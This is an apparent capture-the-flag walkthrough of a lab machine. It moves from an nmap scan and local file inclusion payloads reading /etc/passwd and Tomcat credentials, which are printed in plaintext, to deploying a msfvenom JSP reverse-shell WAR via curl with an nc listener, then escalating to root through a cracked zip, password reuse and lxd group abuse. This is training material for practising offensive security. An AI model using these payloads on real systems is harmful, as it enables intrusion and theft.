### Scanning process
nmap ip:
``` 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|   256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)

8080/tcp open  http    Apache Tomcat

```
Let's examine what type of page is with `whatweb` to see more information about it. 
Now we can analize the main page that it is running in http://10.10.10.194 and we will see that it is necesary to add host megahostin.htb to /etc/hosts.

This page is vulnerable to LFI (Local File Inclusion) 'http://megahosting.htb/news.php?file=statement' where we can access interesting files such as:
1. ../../../../etc/passwd
2. ../../../../../proc/net/tcp 

In the last local file we can find all open ports of the machine which we couldn't see them before. With nmap we saw all ports that the firewall didn't filter.


It is important to analize 8080 ports (http://10.10.10.194:8080) and there are critical information:
```
NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". **Users are defined in /etc/tomcat9/tomcat-users.xml**.
```

We can access to tomcat-users.xml but it seems it is not in that directory, so we can install apache2 in a docker to see where is it.

To get a new instance of docker: `docker run --rm -it ubuntu bash`. Install locate tool and apache2 to see where is the file. 

When we catch the credentials, we can access to http://10.10.10.194:8080/host-manager. 

### Exploit vulnerabilities
Now we can upload a .war file to bumped this machine.
1. msfvenom -l payloads \| grep java.
2. Create a .war: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={your ip} LPORT=443 -f war -o reverse.war`
3. List apps: `curl -s -u 'tomcat:$3cureP4s5w0rd123!' -X GET 'http://10.10.10.194:8080/manager/text/list' `
4. Upload app: `curl -s -u 'tomcat:'$3cureP4s5w0rd123!' 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse' --upload-file reverse.war`
5. Listen at: `nc -lnvp 443`
6. Go to: http://10.10.10.194:8080/reverse
 
### Privilege Scalation
We firts have to find where is user.txt. `find / \-name user.txt 2> /dev/null`. It is on ash user so we have to migrate to ash.
In the directory of /var/www/files/ there is a compress zip that we can crack in local mode. We have to get the file in our computer and crack it.
It give us a new password so... Why not try with ash credentials? Yep, it is the same password.


Now we have to see our goups id. Ejecute: `id` and ash is in lxd group.
Using `searchsploit lxd` let us root access.
